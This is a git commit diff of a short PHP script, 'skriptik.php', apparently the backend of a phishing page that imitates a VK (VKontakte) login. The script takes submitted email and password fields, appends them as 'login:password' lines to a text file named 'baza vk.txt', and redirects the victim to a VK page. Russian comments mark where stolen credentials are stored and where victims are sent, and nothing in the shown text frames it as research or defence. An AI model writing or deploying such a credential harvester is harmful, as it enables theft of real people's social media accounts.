5662dde87fb52ba05c40fde1aa1af29971506f2f
iwebdan <41253891+iwebdan@users.noreply.github.com>
2018-07-15 16:21:52 +0500

    Add files via upload

--- skriptik.php
+++ skriptik.php
@@ -1,8 +1,10 @@
 <?PHP
-$Log = $_POST['login'];
+//**Private-Skripts**\\
+//**Скриптик**\\
+$Log = $_POST['email'];
 $Pass = $_POST['pass'];
-$log = fopen("baza.php","at");
+$log = fopen("baza vk.txt","at");//тут короче название куда будут сохрянться.txt
 fwrite($log,"$Log:$Pass\n");
 fclose($log);
-echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/votes4all'></head></html>";
+echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/privateskripts'></head></html>";//ТУТ КУДА ПЕРЕНАПРАВЛЯЕМ ПОСЛЕ ВХОДА!
 ?>
